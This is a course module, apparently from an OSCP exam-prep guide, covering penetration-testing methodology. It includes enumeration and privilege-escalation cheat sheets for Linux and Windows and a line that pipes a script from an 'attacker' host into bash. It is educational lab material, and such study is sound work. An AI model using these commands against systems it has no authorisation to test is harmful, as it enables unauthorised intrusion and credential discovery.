# Unit 4: OSCP Preparation — Topic 3: Methodology Development

## Overview

A solid, repeatable **methodology** is the single most important factor for OSCP success. This topic covers how to build your personal attack methodology, create cheat sheets, and develop the systematic approach needed to tackle unknown machines under pressure.

---

## 1. Building Your Methodology

```
OSCP ATTACK METHODOLOGY:

PHASE 1: RECONNAISSANCE
  ┌─────────────────────────────────┐
  │ 1. Full TCP port scan           │
  │ 2. Top UDP port scan            │
  │ 3. Service version detection    │
  │ 4. Script scanning              │
  │ 5. OS fingerprinting            │
  └─────────────────────────────────┘

PHASE 2: ENUMERATION (per service)
  ┌─────────────────────────────────┐
  │ HTTP: Directory brute, source   │
  │ SMB: Shares, users, null sess   │
  │ FTP: Anonymous login, files     │
  │ SSH: Version, brute force last  │
  │ DNS: Zone transfer, subdomain   │
  │ SNMP: Community strings, walk   │
  │ Other: Google version + exploit │
  └─────────────────────────────────┘

PHASE 3: VULNERABILITY ANALYSIS
  ┌─────────────────────────────────┐
  │ 1. searchsploit service version │
  │ 2. Google: "version exploit"    │
  │ 3. Check default credentials    │
  │ 4. Manual testing (injection)   │
  │ 5. Config file analysis         │
  └─────────────────────────────────┘

PHASE 4: EXPLOITATION
  ┌─────────────────────────────────┐
  │ 1. Choose simplest exploit      │
  │ 2. Set up listener              │
  │ 3. Modify exploit if needed     │
  │ 4. Execute and catch shell      │
  │ 5. Stabilize shell              │
  └─────────────────────────────────┘

PHASE 5: POST-EXPLOITATION
  ┌─────────────────────────────────┐
  │ 1. whoami / id                  │
  │ 2. Grab user flag               │
  │ 3. Run enumeration script       │
  │ 4. Manual enumeration           │
  │ 5. Escalate privileges          │
  │ 6. Grab root/admin flag         │
  └─────────────────────────────────┘
```

---

## 2. Enumeration Cheat Sheet

```
SERVICE-SPECIFIC ENUMERATION:

HTTP/HTTPS (80/443):
  # Directory brute force
  gobuster dir -u http://target -w /usr/share/
  seclists/Discovery/Web-Content/raft-medium-
  directories.txt -x php,txt,html
  
  # Check robots.txt, sitemap.xml
  curl http://target/robots.txt
  
  # Nikto scan
  nikto -h http://target
  
  # Source code review
  # Check for: comments, hidden fields, 
  # JavaScript files, API endpoints

SMB (139/445):
  # Enumerate shares
  smbclient -L //target -N
  smbmap -H target
  
  # Null session
  rpcclient -U "" -N target
  
  # Enum4linux
  enum4linux -a target
  
  # CrackMapExec
  crackmapexec smb target -u '' -p ''

FTP (21):
  # Anonymous login
  ftp target
  # user: anonymous, pass: (blank)
  
  # Nmap scripts
  nmap --script ftp-anon,ftp-bounce target

DNS (53):
  # Zone transfer
  dig axfr @target domain.com
  host -t axfr domain.com target
  
  # Subdomain enumeration
  gobuster dns -d domain.com -w subdomains.txt

SNMP (161):
  # Community string brute force
  onesixtyone -c community.txt target
  
  # Walk MIB tree
  snmpwalk -v2c -c public target

NFS (2049):
  # Show mounts
  showmount -e target
  
  # Mount share
  mount -t nfs target:/share /mnt/nfs
```

---

## 3. Privilege Escalation Methodology

```
LINUX PRIVILEGE ESCALATION:

AUTOMATED:
  # LinPEAS
  curl http://attacker/linpeas.sh | bash
  
  # LinEnum
  ./linenum.sh -t
  
  # linux-smart-enumeration
  ./lse.sh -l 1

MANUAL CHECKS:
  # Current user
  id && whoami
  
  # Sudo permissions
  sudo -l
  
  # SUID binaries
  find / -perm -4000 -type f 2>/dev/null
  
  # Writable files
  find / -writable -type f 2>/dev/null
  
  # Cron jobs
  cat /etc/crontab
  ls -la /etc/cron.d/
  
  # Running processes
  ps aux
  
  # Internal services
  ss -tulpn
  
  # Kernel version
  uname -a
  cat /etc/os-release
  
  # Check GTFOBins for SUID/sudo exploits

WINDOWS PRIVILEGE ESCALATION:

AUTOMATED:
  # WinPEAS
  winpeas.exe
  
  # PowerUp
  powershell -ep bypass
  Import-Module PowerUp.ps1
  Invoke-AllChecks

MANUAL CHECKS:
  # Current user
  whoami /priv
  whoami /groups
  
  # Unquoted service paths
  wmic service get name,pathname |
  findstr /i /v "C:\Windows"
  
  # Modifiable services
  accesschk.exe -wuvc *
  
  # Scheduled tasks
  schtasks /query /fo LIST /v
  
  # Installed programs
  Get-ItemProperty 
  "HKLM:\Software\Microsoft\Windows\
  CurrentVersion\Uninstall\*"
  
  # AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\
  Microsoft\Windows\Installer
  
  # Stored credentials
  cmdkey /list
```

---

## 4. Note-Taking and Documentation

```
NOTE-TAKING SYSTEMS:

RECOMMENDED TOOLS:
  → CherryTree: Hierarchical notes
    - Tree structure per machine
    - Embedded screenshots
    - Code blocks
    - Export to PDF/HTML
  
  → Obsidian: Markdown-based
    - Linking between notes
    - Templates support
    - Search across notes
  
  → Notion: Web-based
    - Templates and databases
    - Shared access
    - Rich formatting

NOTE STRUCTURE PER MACHINE:

  📁 Machine Name (IP)
  ├── 📄 Info
  │   → IP, OS, Hostname
  │   → Difficulty rating
  ├── 📄 Reconnaissance
  │   → Nmap output
  │   → Open ports list
  ├── 📄 Enumeration
  │   → Per-service findings
  │   → Interesting files/users
  ├── 📄 Exploitation
  │   → Vulnerability details
  │   → Exploit used
  │   → Exact commands
  │   → Shell obtained
  ├── 📄 Post-Exploitation
  │   → PrivEsc vector
  │   → Commands used
  │   → Proof files
  ├── 📄 Screenshots
  │   → Proof screenshots
  │   → Key finding screenshots
  └── 📄 Lessons Learned
      → What worked
      → What didn't
      → Key takeaways

CREATING YOUR CHEAT SHEET:
  → Document every command that works
  → Organize by category
  → Include one-liners and scripts
  → Update continuously
  → Have it ready for exam day
```

---

## 5. Building Mental Models

```
PATTERN RECOGNITION:

COMMON EXAM PATTERNS:
  → Web app → credentials → SSH → privesc
  → FTP anonymous → download file → exploit
  → SMB share → find password → access
  → SQL injection → file read/write → RCE
  → Outdated service → public exploit → shell
  → Weak password → login → misconfigured sudo

DECISION TREE:
  Port 80/443 open?
  ├── Yes → Web enumeration first
  │   ├── Login page? → Default creds, SQLi
  │   ├── CMS? → Version, known exploits
  │   ├── File upload? → Bypass filters
  │   └── Parameters? → Test injection
  └── No → Check other services
      ├── SMB (445)? → Shares, null session
      ├── FTP (21)? → Anonymous access
      ├── SSH (22)? → Credential reuse
      └── Unknown? → Google service + exploit

WHEN STUCK:
  1. Re-enumerate (did you miss something?)
  2. Try different wordlist
  3. Check all found credentials everywhere
  4. Look at source code more carefully
  5. Try different exploit version
  6. Check for hidden parameters
  7. Enumerate internal services
  8. Try password mutations
  9. Sleep on it — fresh eyes help
  10. "Try Harder" — the OSCP motto

DEVELOPING INTUITION:
  → Practice 100+ machines
  → Review writeups after solving
  → Study how others approach problems
  → Track what techniques lead to shells
  → Build muscle memory for enumeration
```

---

## Summary Table

| Phase | Key Actions | Time Allocation |
|-------|-----------|----------------|
| Reconnaissance | Full Nmap, UDP | 15% |
| Enumeration | Service-specific deep dive | 45% |
| Vuln Analysis | Searchsploit, Google | 10% |
| Exploitation | Exploit, catch shell | 15% |
| Post-Exploitation | PrivEsc, proof | 15% |

---

## Revision Questions

1. What is the recommended time split between enumeration and exploitation?
2. What manual checks should you perform for Linux privilege escalation?
3. What note-taking structure do you use per machine?
4. What should you do when you're stuck on a machine during the exam?
5. What common attack patterns appear on OSCP-style machines?

---

*Previous: [02-lab-strategy.md](02-lab-strategy.md) | Next: [04-report-writing.md](04-report-writing.md)*

---

*[Back to README](../README.md)*
